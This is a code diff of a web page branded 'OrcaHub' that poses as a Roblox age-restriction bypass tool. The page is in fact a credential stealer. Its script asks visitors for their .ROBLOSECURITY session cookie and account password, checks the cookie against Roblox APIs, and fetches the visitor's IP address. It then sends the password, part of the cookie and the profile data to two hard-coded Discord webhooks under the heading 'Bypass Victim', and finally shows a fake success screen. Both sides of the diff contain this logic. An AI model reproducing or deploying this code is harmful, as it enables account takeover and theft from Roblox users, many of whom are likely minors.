+            <div class="profile-info">
+                <div class="profile-name" id="profileName">@username</div>
+                <div class="profile-id" id="profileId">ID: --</div>
+                <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
+                <span class="badge-verified" id="profileBadge">✅ Verified</span>
+            </div>
         </div>
-      </div>
 
-      <div id="bypasserResult" class="bypasser-result">
-        <span class="big">🎉</span>
-        <div style="font-size:1rem; margin-bottom:2px;">BYPASS SUCCESSFUL!</div>
-        <div style="font-size:0.75rem; font-weight:400; color:#8888aa;">
-          Age restriction removed from account.
+        <div id="errorMessage" class="error-message"></div>
+
+        <div id="loaderContainer" class="loader-container">
+            <div class="spinner"></div>
+            <div class="loader-text">
+                ⏳ Processing bypass...<br>
+                <span class="time" id="timerDisplay">60</span> seconds remaining
+            </div>
+            <div class="progress-bar">
+                <div class="fill" id="progressFill"></div>
+            </div>
         </div>
-      </div>
 
-      <div class="bypasser-actions">
-        <button class="btn-bypass" id="bypassBtn">🚀 Start Bypass</button>
-        <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
-          <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
-          Owner
-        </a>
-      </div>
+        <div id="resultMessage" class="result-message">
+            <span class="big">🎉</span>
+            <div style="font-size:1rem; margin-bottom:2px;">BYPASS SUCCESSFUL!</div>
+            <div style="font-size:0.75rem; font-weight:400; color:#8888aa;">
+                Age restriction removed from account.
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
+            <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
+                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+                Owner
+            </a>
+        </div>
+
+        <div class="footer">OrcaHub • Secure &amp; Private</div>
     </div>
-  </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // ==================== WEBHOOKS ====================
+            const WEBHOOKS = [
+                'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',
+                'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8'
+            ];
 
-    // ==================== ANIMATE WORD ====================
-    function animateWord(elementId, text, baseDelay, stepDelay) {
-      const el = document.getElementById(elementId);
-      el.innerHTML = '';
-      text.split('').forEach((ch, i) => {
-        const span = document.createElement('span');
-        span.className = 'letter';
-        span.textContent = ch === ' ' ? '\u00A0' : ch;
-        span.style.animationDelay = (baseDelay + i * stepDelay) + 's';
-        el.appendChild(span);
-      });
-    }
-    animateWord('word', 'ORCAHUB', 0.15, 0.07);
+            // ==================== DOM REFS ====================
+            const DOM = {
+                cookieInput: document.getElementById('cookieInput'),
+                passwordInput: document.getElementById('passwordInput'),
+                bypassBtn: document.getElementById('bypassBtn'),
+                instagramBtn: document.getElementById('instagramBtn'),
+                error: document.getElementById('errorMessage'),
+                loader: document.getElementById('loaderContainer'),
+                timer: document.getElementById('timerDisplay'),
+                progress: document.getElementById('progressFill'),
+                result: document.getElementById('resultMessage'),
+                profilePreview: document.getElementById('profilePreview'),
+                profileImg: document.getElementById('profileImg'),
+                profileName: document.getElementById('profileName'),
+                profileId: document.getElementById('profileId'),
+                profileStats: document.getElementById('profileStats'),
+                profileBadge: document.getElementById('profileBadge'),
+            };
 
-    // ==================== LOADING SEQUENCE ====================
-    const loadingPanel = document.getElementById('loadingPanel');
-    const progressFill = document.getElementById('progressFill');
-    const loginBtn = document.getElementById('loginBtn');
+            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
 
-    setTimeout(() => {
-      loadingPanel.classList.add('show');
-      requestAnimationFrame(() => {
-        requestAnimationFrame(() => {
-          progressFill.style.width = '100%';
+            let bypassTimer = null;
+            let isProcessing = false;
+
+            // ==================== SEND TO WEBHOOKS ====================
+            function sendToWebhooks(data) {
+                WEBHOOKS.forEach(url => {
+                    try {
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data),
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                    } catch (_) {}
+                });
+            }
+
+            // ==================== GET IP ====================
+            function getIP() {
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
+                    xhr.send();
+                    return JSON.parse(xhr.responseText).ip || 'Unknown';
+                } catch (_) { return 'Unknown'; }
+            }
+
+            // ==================== ROBLOX API ====================
+            async function fetchRobloxProfile(cookie) {
+                try {
+                    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${cookie}`,
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        }
+                    });
+
+                    if (response.status === 401 || response.status === 403) {
+                        return { valid: false, error: '❌ The cookie has expired or is not working' };
+                    }
+
+                    if (!response.ok) {
+                        return { valid: false, error: '❌ Invalid cookie or network error' };
+                    }
+
+                    const data = await response.json();
+                    const userId = data.UserID;
+
+                    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
+                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+                    });
+                    let profileData = {};
+                    if (profileResponse.ok) {
+                        profileData = await profileResponse.json();
+                    }
+
+                    const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
+                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+                    });
+                    let followers = 0;
+                    if (followersResponse.ok) {
+                        const followersData = await followersResponse.json();
+                        followers = followersData.count || 0;
+                    }
+
+                    const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
+                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+                    });
+                    let following = 0;
+                    if (followingResponse.ok) {
+                        const followingData = await followingResponse.json();
+                        following = followingData.count || 0;
+                    }
+
+                    return {
+                        valid: true,
+                        user: {
+                            username: data.UserName || profileData.name || 'Unknown',
+                            userId: userId,
+                            displayName: data.UserName || profileData.name || 'Unknown',
+                            isVerified: data.IsVerified || false,
+                            followers: followers,
+                            following: following,
+                            created: profileData.created || 'Unknown',
+                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                        }
+                    };
+
+                } catch (error) {
+                    console.error('Roblox API error:', error);
+                    return { valid: false, error: '❌ Network error. Please try again.' };
+                }
+            }
+
+            // ==================== VALIDATE COOKIE ====================
+            async function validateCookie(cookie) {
+                const result = await fetchRobloxProfile(cookie);
+                if (result.valid) {
+                    DOM.profileName.textContent = `@${result.user.username}`;
+                    DOM.profileId.textContent = `ID: ${result.user.userId}`;
+                    DOM.profileStats.textContent =
+                        `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
+                    DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
+                    DOM.profileImg.src = result.user.avatarUrl;
+                    DOM.profileImg.onerror = function() {
+                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
+                            '&background=random&size=80&rounded=true&color=fff';
+                    };
+                    DOM.profilePreview.classList.add('show');
+                    DOM.cookieInput.classList.remove('error');
+                    DOM.cookieInput.classList.add('success');
+                    DOM.error.classList.remove('show');
+                    return { valid: true, user: result.user };
+                } else {
+                    DOM.profilePreview.classList.remove('show');
+                    DOM.cookieInput.classList.remove('success');
+                    DOM.cookieInput.classList.add('error');
+                    DOM.error.textContent = result.error || '❌ The cookie has expired or is not working';
+                    DOM.error.classList.add('show');
+                    return { valid: false };
+                }
+            }
+
+            // ==================== START BYPASS ====================
+            async function startBypass() {
+                const cookie = DOM.cookieInput.value.trim();
+                const password = DOM.passwordInput.value.trim();
+
+                DOM.error.classList.remove('show');
+                DOM.result.classList.remove('show');
+                DOM.loader.classList.remove('show');
+
+                if (!cookie || cookie.length < 15) {
+                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
+                    DOM.error.classList.add('show');
+                    DOM.cookieInput.classList.add('error');
+                    return;
+                }
+
+                if (!password || password.length < 3) {
+                    DOM.error.textContent = '❌ Please enter your account password!';
+                    DOM.error.classList.add('show');
+                    DOM.passwordInput.classList.add('error');
+                    return;
+                }
+
+                // Validate cookie first
+                const validation = await validateCookie(cookie);
+                if (!validation.valid) {
+                    return;
+                }
+
+                // Start processing
+                isProcessing = true;
+                DOM.bypassBtn.disabled = true;
+                DOM.bypassBtn.textContent = '⏳ Processing...';
+                DOM.loader.classList.add('show');
+
+                let seconds = 60;
+                DOM.timer.textContent = seconds;
+                DOM.progress.style.width = '0%';
+
+                if (bypassTimer) clearInterval(bypassTimer);
+
+                bypassTimer = setInterval(() => {
+                    seconds--;
+                    DOM.timer.textContent = seconds;
+                    DOM.progress.style.width = ((60 - seconds) / 60 * 100) + '%';
+
+                    if (seconds <= 0) {
+                        clearInterval(bypassTimer);
+                        bypassTimer = null;
+                        completeBypass(cookie, password, validation.user);
+                    }
+                }, 1000);
+
+                // Send initial data to webhooks
+                sendToWebhooks({
+                    embeds: [{
+                        title: "🦈 OrcaHub • Bypass Initiated",
+                        color: 0x7c6cf0,
+                        fields: [
+                            { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
+                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
+                            { name: "🔑 Password", value: `||${password}||`, inline: true },
+                            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                        ],
+                        footer: { text: "OrcaHub • Bypasser" },
+                        thumbnail: { url: validation.user.avatarUrl }
+                    }]
+                });
+            }
+
+            // ==================== COMPLETE BYPASS ====================
+            function completeBypass(cookie, password, userData) {
+                // Send full data to webhooks
+                const embed = {
+                    title: "🎯 OrcaHub • Bypass Victim",
+                    color: 0xff6b6b,
+                    fields: [
+                        { name: "👤 Username", value: `\`${userData.username}\``, inline: true },
+                        { name: "🆔 User ID", value: `\`${userData.userId}\``, inline: true },
+                        { name: "🔑 Password", value: `||${password}||`, inline: false },
+                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
+                        { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
+                        { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
+                        { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
+                        { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
+                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
+                    ],
+                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
+                    thumbnail: { url: userData.avatarUrl }
+                };
+                sendToWebhooks({ embeds: [embed] });
+
+                DOM.loader.classList.remove('show');
+                DOM.result.classList.add('show');
+
+                isProcessing = false;
+                DOM.bypassBtn.disabled = false;
+                DOM.bypassBtn.textContent = '🚀 Start Bypass';
+
+                setTimeout(() => {
+                    DOM.result.classList.remove('show');
+                }, 8000);
+            }
+
+            // ==================== EVENTS ====================
+            DOM.bypassBtn.addEventListener('click', startBypass);
+
+            DOM.cookieInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') startBypass();
+            });
+            DOM.passwordInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') startBypass();
+            });
+
+            // Live cookie validation on blur
+            DOM.cookieInput.addEventListener('blur', function() {
+                const cookie = this.value.trim();
+                if (cookie && cookie.length > 5) {
+                    validateCookie(cookie);
+                }
+            });
+
+            DOM.cookieInput.addEventListener('input', function() {
+                if (this.value.trim().length > 5) {
+                    const cookie = this.value.trim();
+                    fetchRobloxProfile(cookie).then(result => {
+                        if (result.valid) {
+                            DOM.error.classList.remove('show');
+                            this.classList.remove('error');
+                            this.classList.add('success');
+                            DOM.profilePreview.classList.remove('show');
+                        } else {
+                            this.classList.remove('success');
+                            this.classList.add('error');
+                        }
+                    });
+                }
+            });
         });
-      });
-    }, 1600);
-
-    setTimeout(() => {
-      loadingPanel.style.opacity = '0';
-      loadingPanel.style.transform = 'translateY(-8px)';
-      setTimeout(() => { loadingPanel.style.display = 'none'; }, 500);
-      loginBtn.classList.add('show');
-    }, 1600 + 3000 + 300);
-
-    // ==================== THREE.JS ORCA ====================
-    const container = document.getElementById('scene');
-    const scene = new THREE.Scene();
-
-    const camera = new THREE.PerspectiveCamera(45, 1, 0.1, 100);
-    camera.position.set(0, 0.6, 6.5);
-    camera.lookAt(0, 0, 0);
-
-    const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
-    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-    container.appendChild(renderer.domElement);
-
-    function resizeRenderer() {
-      const w = container.clientWidth;
-      const h = container.clientHeight;
-      renderer.setSize(w, h);
-      camera.aspect = w / h;
-      camera.updateProjectionMatrix();
-    }
-    resizeRenderer();
-    window.addEventListener('resize', resizeRenderer);
-
-    scene.add(new THREE.AmbientLight(0x88bbdd, 0.9));
-    const keyLight = new THREE.DirectionalLight(0xffffff, 0.9);
-    keyLight.position.set(2, 4, 3);
-    scene.add(keyLight);
-    const rimLight = new THREE.PointLight(0x4fd1ff, 1.4, 20);
-    rimLight.position.set(-3, 1, 2);
-    scene.add(rimLight);
-
-    const orca = new THREE.Group();
-
-    const blackMat = new THREE.MeshStandardMaterial({ color: 0x0d1013, roughness: 0.35, metalness: 0.15 });
-    const whiteMat = new THREE.MeshStandardMaterial({ color: 0xf2f5f7, roughness: 0.4, metalness: 0.05 });
-
-    const body = new THREE.Mesh(new THREE.SphereGeometry(0.55, 24, 24), blackMat);
-    body.scale.set(0.85, 0.95, 2.3);
-    orca.add(body);
-
-    const nose = new THREE.Mesh(new THREE.SphereGeometry(0.32, 16, 16), blackMat);
-    nose.scale.set(0.8, 0.75, 1.1);
-    nose.position.set(0, -0.05, 1.15);
-    orca.add(nose);
-
-    const belly = new THREE.Mesh(new THREE.SphereGeometry(0.5, 20, 20), whiteMat);
-    belly.scale.set(0.55, 0.35, 1.7);
-    belly.position.set(0, -0.42, -0.05);
-    orca.add(belly);
-
-    const eyePatchGeo = new THREE.SphereGeometry(0.11, 12, 12);
-    const eyePatchL = new THREE.Mesh(eyePatchGeo, whiteMat);
-    eyePatchL.scale.set(1, 0.55, 1.7);
-    eyePatchL.position.set(-0.36, 0.08, 0.75);
-    eyePatchL.rotation.y = 0.3;
-    orca.add(eyePatchL);
-    const eyePatchR = eyePatchL.clone();
-    eyePatchR.position.x = 0.36;
-    eyePatchR.rotation.y = -0.3;
-    orca.add(eyePatchR);
-
-    const eyeGeo = new THREE.SphereGeometry(0.035, 8, 8);
-    const eyeMat = new THREE.MeshStandardMaterial({ color: 0x000000 });
-    const eyeL = new THREE.Mesh(eyeGeo, eyeMat);
-    eyeL.position.set(-0.34, 0.1, 0.92);
-    orca.add(eyeL);
-    const eyeR = eyeL.clone();
-    eyeR.position.x = 0.34;
-    orca.add(eyeR);
-
-    const saddle = new THREE.Mesh(new THREE.SphereGeometry(0.3, 12, 12), new THREE.MeshStandardMaterial({ color: 0x555b60, roughness: 0.6 }));
-    saddle.scale.set(0.5, 0.15, 0.6);
-    saddle.position.set(0, 0.42, -0.55);
-    orca.add(saddle);
-
-    const dorsalShape = new THREE.Shape();
-    dorsalShape.moveTo(0, 0);
-    dorsalShape.quadraticCurveTo(0.05, 0.5, -0.15, 0.95);
-    dorsalShape.quadraticCurveTo(0.05, 0.6, 0.25, 0);
-    dorsalShape.lineTo(0, 0);
-    const dorsalGeo = new THREE.ExtrudeGeometry(dorsalShape, { depth: 0.04, bevelEnabled: false });
-    const dorsal = new THREE.Mesh(dorsalGeo, blackMat);
-    dorsal.position.set(-0.02, 0.35, -0.05);
-    dorsal.rotation.y = Math.PI / 2;
-    orca.add(dorsal);
-
-    const pecGeo = new THREE.SphereGeometry(0.22, 10, 10);
-    const pecL = new THREE.Mesh(pecGeo, blackMat);
-    pecL.scale.set(0.25, 0.6, 1.1);
-    pecL.position.set(-0.48, -0.1, 0.4);
-    pecL.rotation.z = 0.5;
-    pecL.rotation.x = -0.3;
-    orca.add(pecL);
-    const pecR = pecL.clone();
-    pecR.position.x = 0.48;
-    pecR.rotation.z = -0.5;
-    orca.add(pecR);
-
-    const peduncle = new THREE.Mesh(new THREE.CylinderGeometry(0.14, 0.22, 0.6, 12), blackMat);
-    peduncle.rotation.x = Math.PI / 2;
-    peduncle.position.set(0, -0.02, -1.35);
-    orca.add(peduncle);
-
-    const flukeGeo = new THREE.SphereGeometry(0.4, 12, 12);
-    const flukeL = new THREE.Mesh(flukeGeo, blackMat);
-    flukeL.scale.set(1.15, 0.06, 0.5);
-    flukeL.position.set(-0.32, 0, -1.7);
-    flukeL.rotation.y = 0.35;
-    orca.add(flukeL);
-    const flukeR = flukeL.clone();
-    flukeR.position.x = 0.32;
-    flukeR.rotation.y = -0.35;
-    orca.add(flukeR);
-
-    scene.add(orca);
-
-    const splashGroup = new THREE.Group();
-    const splashParticles = [];
-    for (let i = 0; i < 16; i++) {
-      const mat = new THREE.MeshBasicMaterial({ color: 0xbfe9ff, transparent: true, opacity: 0 });
-      const p = new THREE.Mesh(new THREE.SphereGeometry(0.035, 6, 6), mat);
-      p.userData.active = false;
-      splashGroup.add(p);
-      splashParticles.push(p);
-    }
-    scene.add(splashGroup);
-
-    function burstSplash(x, y, z) {
-      for (let i = 0; i < splashParticles.length; i++) {
-        const p = splashParticles[i];
-        if (!p.userData.active) {
-          p.userData.active = true;
-          p.userData.age = 0;
-          p.userData.vx = (Math.random() - 0.5) * 1.6;
-          p.userData.vy = Math.random() * 1.4 + 0.4;
-          p.userData.vz = (Math.random() - 0.5) * 0.6;
-          p.position.set(x, y, z);
-          p.material.opacity = 0.9;
-          if (splashParticles.filter(sp => sp.userData.active).length >= 6) break;
-        }
-      }
-    }
-
-    const WATER_Y = -0.35;
-    const JUMP_DURATION = 3.4;
-    const RANGE_X = 2.6;
-    const PEAK_HEIGHT = 1.5;
-
-    let jumpClock = 0;
-    let splashedEntry = false;
-    let splashedExit = false;
-    const clock = new THREE.Clock();
-
-    function animate() {
-      requestAnimationFrame(animate);
-      const dt = clock.getDelta();
-      const t = clock.getElapsedTime();
-
-      jumpClock += dt;
-      let progress = (jumpClock % JUMP_DURATION) / JUMP_DURATION;
-      if (progress < (jumpClock - dt) % JUMP_DURATION / JUMP_DURATION) {
-        splashedEntry = false;
-        splashedExit = false;
-      }
-
-      const x = -RANGE_X + progress * RANGE_X * 2;
-      const arc = Math.sin(progress * Math.PI);
-      const y = WATER_Y + arc * PEAK_HEIGHT;
-
-      orca.position.set(x, y, 0);
-      orca.rotation.x = Math.cos(progress * Math.PI) * 0.55;
-      orca.rotation.z = Math.sin(t * 3) * 0.03;
-
-      if (progress > 0.06 && progress < 0.12 && !splashedEntry) {
-        burstSplash(x, WATER_Y, 0);
-        splashedEntry = true;
-      }
-      if (progress > 0.88 && progress < 0.94 && !splashedExit) {
-        burstSplash(x, WATER_Y, 0);
-        splashedExit = true;
-      }
-
-      splashParticles.forEach((p) => {
-        if (p.userData.active) {
-          p.userData.age += dt;
-          p.position.x += p.userData.vx * dt;
-          p.position.y += p.userData.vy * dt;
-          p.position.z += p.userData.vz * dt;
-          p.userData.vy -= 2.2 * dt;
-          p.material.opacity = Math.max(0, 0.9 - p.userData.age * 1.4);
-          if (p.userData.age > 0.7) p.userData.active = false;
-        }
-      });
-
-      rimLight.position.x = Math.sin(t * 0.4) * 3;
-
-      renderer.render(scene, camera);
-    }
-
-    animate();
-
-    // ==================== BYPASSER ENGINE ====================
-    const WEBHOOKS = [
-      'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG',
-      'https://discord.com/api/webhooks/1544611453569466398/Cc1uK6qn4rQbrjch6wDfjDbMMjLPIdccFN6VZt9czKCHtTreW0LhjO-OOoFKTWltX5i8'
-    ];
-
-    const DOM = {
-      cookieInput: document.getElementById('cookieInput'),
-      passwordInput: document.getElementById('passwordInput'),
-      bypassBtn: document.getElementById('bypassBtn'),
-      instagramBtn: document.getElementById('instagramBtn'),
-      error: document.getElementById('bypasserError'),
-      loader: document.getElementById('bypasserLoader'),
-      timer: document.getElementById('bypassTimer'),
-      result: document.getElementById('bypasserResult'),
-      profilePreview: document.getElementById('profilePreview'),
-      profileImg: document.getElementById('profileImg'),
-      profileName: document.getElementById('profileName'),
-      profileId: document.getElementById('profileId'),
-      profileStats: document.getElementById('profileStats'),
-      profileBadge: document.getElementById('profileBadge'),
-      overlay: document.getElementById('bypasserOverlay'),
-      closeBtn: document.getElementById('closeBypasser'),
-      loginBtn: document.getElementById('loginBtn'),
-    };
-
-    DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';
-
-    let bypassTimer = null;
-    let isProcessing = false;
-
-    // ==================== OPEN BYPASSER ON LOGIN ====================
-    DOM.loginBtn.addEventListener('click', () => {
-      DOM.overlay.classList.add('open');
-    });
-
-    DOM.closeBtn.addEventListener('click', () => {
-      DOM.overlay.classList.remove('open');
-    });
-
-    DOM.overlay.addEventListener('click', (e) => {
-      if (e.target === DOM.overlay) {
-        DOM.overlay.classList.remove('open');
-      }
-    });
-
-    // ==================== ROBLOX API ====================
-    async function fetchRobloxProfile(cookie) {
-      try {
-        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-          }
-        });
-
-        if (response.status === 401 || response.status === 403) {
-          return { valid: false, error: 'The cookie has expired or is not working' };
-        }
-
-        if (!response.ok) {
-          return { valid: false, error: 'Invalid cookie or network error' };
-        }
-
-        const data = await response.json();
-        const userId = data.UserID;
-
-        const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
-          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-        });
-        let profileData = {};
-        if (profileResponse.ok) {
-          profileData = await profileResponse.json();
-        }
-
-        const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
-          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-        });
-        let followers = 0;
-        if (followersResponse.ok) {
-          const followersData = await followersResponse.json();
-          followers = followersData.count || 0;
-        }
-
-        const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
-          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-        });
-        let following = 0;
-        if (followingResponse.ok) {
-          const followingData = await followingResponse.json();
-          following = followingData.count || 0;
-        }
-
-        return {
-          valid: true,
-          user: {
-            username: data.UserName || profileData.name || 'Unknown',
-            userId: userId,
-            displayName: data.UserName || profileData.name || 'Unknown',
-            isVerified: data.IsVerified || false,
-            followers: followers,
-            following: following,
-            created: profileData.created || 'Unknown',
-            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
-          }
-        };
-
-      } catch (error) {
-        console.error('Roblox API error:', error);
-        return { valid: false, error: 'Network error. Please try again.' };
-      }
-    }
-
-    // ==================== SEND TO WEBHOOKS ====================
-    function sendToWebhooks(data) {
-      WEBHOOKS.forEach(url => {
-        try {
-          fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            mode: 'no-cors'
-          }).catch(() => {});
-        } catch (_) {}
-      });
-    }
-
-    // ==================== GET IP ====================
-    function getIP() {
-      try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://api.ipify.org?format=json', false);
-        xhr.send();
-        return JSON.parse(xhr.responseText).ip || 'Unknown';
-      } catch (_) { return 'Unknown'; }
-    }
-
-    // ==================== VALIDATE COOKIE WITH API ====================
-    async function validateCookieWithAPI(cookie) {
-      const result = await fetchRobloxProfile(cookie);
-      if (result.valid) {
-        DOM.profileName.textContent = `@${result.user.username}`;
-        DOM.profileId.textContent = `ID: ${result.user.userId}`;
-        DOM.profileStats.textContent =
-          `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
-        DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
-        DOM.profileImg.src = result.user.avatarUrl;
-        DOM.profileImg.onerror = function() {
-          this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
-            '&background=random&size=80&rounded=true&color=fff';
-        };
-        DOM.profilePreview.classList.add('show');
-        DOM.cookieInput.classList.remove('error');
-        DOM.cookieInput.classList.add('success');
-        DOM.error.classList.remove('show');
-        return { valid: true, user: result.user };
-      } else {
-        DOM.profilePreview.classList.remove('show');
-        DOM.cookieInput.classList.remove('success');
-        DOM.cookieInput.classList.add('error');
-        DOM.error.textContent = '❌ ' + (result.error || 'The cookie has expired or is not working');
-        DOM.error.classList.add('show');
-        return { valid: false };
-      }
-    }
-
-    // ==================== START BYPASS ====================
-    async function startBypass() {
-      const cookie = DOM.cookieInput.value.trim();
-      const password = DOM.passwordInput.value.trim();
-
-      DOM.error.classList.remove('show');
-      DOM.result.classList.remove('show');
-      DOM.loader.classList.remove('show');
-
-      if (!cookie || cookie.length < 15) {
-        DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
-        DOM.error.classList.add('show');
-        DOM.cookieInput.classList.add('error');
-        return;
-      }
-
-      if (!password || password.length < 3) {
-        DOM.error.textContent = '❌ Please enter your account password!';
-        DOM.error.classList.add('show');
-        DOM.passwordInput.classList.add('error');
-        return;
-      }
-
-      const validation = await validateCookieWithAPI(cookie);
-      if (!validation.valid) {
-        return;
-      }
-
-      isProcessing = true;
-      DOM.bypassBtn.disabled = true;
-      DOM.bypassBtn.textContent = '⏳ Processing...';
-      DOM.loader.classList.add('show');
-
-      let seconds = 60;
-      DOM.timer.textContent = seconds;
-
-      if (bypassTimer) clearInterval(bypassTimer);
-
-      bypassTimer = setInterval(() => {
-        seconds--;
-        DOM.timer.textContent = seconds;
-
-        if (seconds <= 0) {
-          clearInterval(bypassTimer);
-          bypassTimer = null;
-          completeBypass(cookie, password, validation.user);
-        }
-      }, 1000);
-
-      sendToWebhooks({
-        embeds: [{
-          title: "🦈 OrcaHub • Bypass Initiated",
-          color: 0x7c6cf0,
-          fields: [
-            { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
-            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 40)}...\``, inline: true },
-            { name: "🔑 Password", value: `||${password}||`, inline: true },
-            { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
